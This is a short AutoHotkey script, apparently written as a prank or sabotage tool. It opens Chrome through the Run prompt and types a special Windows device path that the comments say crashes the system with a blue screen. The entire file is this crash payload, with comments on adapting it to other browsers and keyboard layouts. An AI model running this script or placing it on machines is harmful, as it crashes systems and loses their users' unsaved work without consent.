#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

Goto Payload

Payload:
Sleep, 1000 ; A bit of delay
Send #r ; Opens a run prompt
Sleep, 500
Send, chrome ; Opens Chrome, change to Firefox if you need to
Send {Enter}
Sleep, 1000 
Send, ^!q^!q.^!qglobalroot^!qdevice^!qcondrv^!qkernelconnect ; The actual path, you can change the "^!q" parts to a \, my layout required me to do this.
; Here is the original path: \\.\globalroot\device\condrv\kernelconnect
Sleep, 2000 ; Delay to prevent accidental BSOD.
Send {Enter} ; This is when the BSOD is triggered.
